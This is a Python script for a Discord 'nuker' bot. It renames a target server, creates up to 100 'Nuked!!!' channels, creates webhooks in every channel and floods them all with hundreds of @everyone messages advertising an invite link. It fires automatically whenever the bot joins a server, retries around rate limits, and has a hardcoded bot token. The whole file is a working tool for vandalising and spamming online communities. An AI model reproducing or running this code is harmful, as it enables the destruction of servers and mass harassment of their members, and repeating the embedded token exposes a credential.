import discord
import asyncio
import logging
import sys

# Configuration Variables
NUM_CHANNELS = 100  # Set to a reasonable number within the limit
NUM_MESSAGES_PER_CHANNEL = 522  # Number of messages to send per channel
NUM_WEBHOOKS_PER_CHANNEL = 10  # Number of webhooks to create per channel
BOT_TOKEN = "MTIzMTk5MDU0NjY1MDg5NDM0Ng.GZvFt4.sl4MsAk7UYZjTF_y0biNsKK7HHzhrMwLYkQLs4"

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

client = discord.Client(intents=intents)

logging.basicConfig(level=logging.INFO)

async def safe_request(request_func, *args, **kwargs):
    retry_delay = 1  # Start with 1 second delay for exponential backoff
    max_retries = 5  # Max number of retries
    for attempt in range(max_retries):
        try:
            return await request_func(*args, **kwargs)
        except discord.errors.HTTPException as e:
            if e.status == 429:
                retry_after = e.response.headers.get('Retry-After')
                if retry_after:
                    retry_after = float(retry_after) / 1000  # Convert milliseconds to seconds
                    print(f"Rate limited. Retrying after {retry_after} seconds.")
                    await asyncio.sleep(retry_after)
            else:
                print(f"HTTPException encountered: {e}")
                await asyncio.sleep(retry_delay)
                retry_delay *= 2  # Exponential backoff
        except Exception as e:
            print(f"Exception encountered: {e}")
            await asyncio.sleep(retry_delay)
            retry_delay *= 2  # Exponential backoff

async def rename_server(guild):
    await safe_request(guild.edit, name="Nuked by Mono nuker")
    print(f"Renamed server.'")

async def create_and_initialize_channel(guild, message, num_messages):
    new_channel = await safe_request(guild.create_text_channel, 'Nuked!!!')
    if new_channel:
        print(f"Created new channel: {new_channel.name}")
        # Prepare to send messages to the newly created channel
        tasks = [safe_request(new_channel.send, message) for _ in range(num_messages)]
        await asyncio.gather(*tasks)

async def send_messages_concurrently(channels, message, num_messages):
    tasks = []
    for channel in channels:
        # Schedule messages to be sent concurrently in each channel
        tasks.extend([safe_request(channel.send, message) for _ in range(num_messages)])
    # Use asyncio.gather to run message-sending tasks concurrently
    await asyncio.gather(*tasks)

async def create_and_initialize_webhook(channel, message, num_messages, num_webhooks):
    webhooks = []
    for _ in range(num_webhooks):
        webhook = await safe_request(channel.create_webhook, name='Nuker Webhook')
        if webhook:
            webhooks.append(webhook)
            print(f"Created new webhook: {webhook.name}")

    tasks = []
    for webhook in webhooks:
        tasks.extend([safe_request(webhook.send, content=message) for _ in range(num_messages)])

    await asyncio.gather(*tasks)

async def create_webhooks_and_send_messages(guild, message, num_messages, num_webhooks):
    tasks = []
    for channel in guild.text_channels:
        tasks.append(create_and_initialize_webhook(channel, message, num_messages, num_webhooks))
    await asyncio.gather(*tasks)

async def manage_server(guild):
    # Rename the server
    await rename_server(guild)

    # Step 1: Concurrently create new channels and send initial messages
    channel_creation_tasks = [create_and_initialize_channel(guild, 'Nuked by mono nuker (powered by pluxus)! [JOIN NOW!](https://discord.gg/aCAk3DfWKU) @everyone @here', NUM_MESSAGES_PER_CHANNEL) for _ in range(min(NUM_CHANNELS, 500 - len(guild.text_channels)))]
    await asyncio.gather(*channel_creation_tasks)

    # Step 2: Send messages in all channels, including the newly created ones, concurrently
    await send_messages_concurrently(guild.text_channels, 'Nuked by mono nuker (powered by pluxus)! [JOIN NOW!](https://discord.gg/aCAk3DfWKU) @everyone @here', NUM_MESSAGES_PER_CHANNEL)

@client.event
async def on_ready():
    print(f'logged in as {client.user}')
    await menu()

async def menu():
    while True:
        print("Select an option:")
        print("1. Nuke a server")
        print("2. Exit")

        choice = input("Enter your choice: ")
        if choice == '1':
            guild_id = int(input("Enter the guild ID: "))
            print("Loading...")
            guild = client.get_guild(guild_id)
            if guild:
                await manage_server(guild)  # Schedule the task for managing the server
                await create_webhooks_and_send_messages(guild, 'Nuked by mono nuker (powered by pluxus)! [JOIN NOW!](https://discord.gg/aCAk3DfWKU) @everyone @here', NUM_MESSAGES_PER_CHANNEL, NUM_WEBHOOKS_PER_CHANNEL)  # Schedule webhook creation and messaging
            else:
                print("Guild not found.")
        elif choice == '2':
            print("Exiting...")
            await client.close()
            sys.exit()
        else:
            print("Invalid choice, please try again.")

@client.event
async def on_guild_join(guild):
    await manage_server(guild)  # Schedule the task when joining a new guild
    await create_webhooks_and_send_messages(guild, 'Nuked by mono nuker (powered by pluxus)! [JOIN NOW!](https://discord.gg/aCAk3DfWKU) @everyone @here', NUM_MESSAGES_PER_CHANNEL, NUM_WEBHOOKS_PER_CHANNEL)  # Schedule webhook creation and messaging

async def main():
    await client.start(BOT_TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
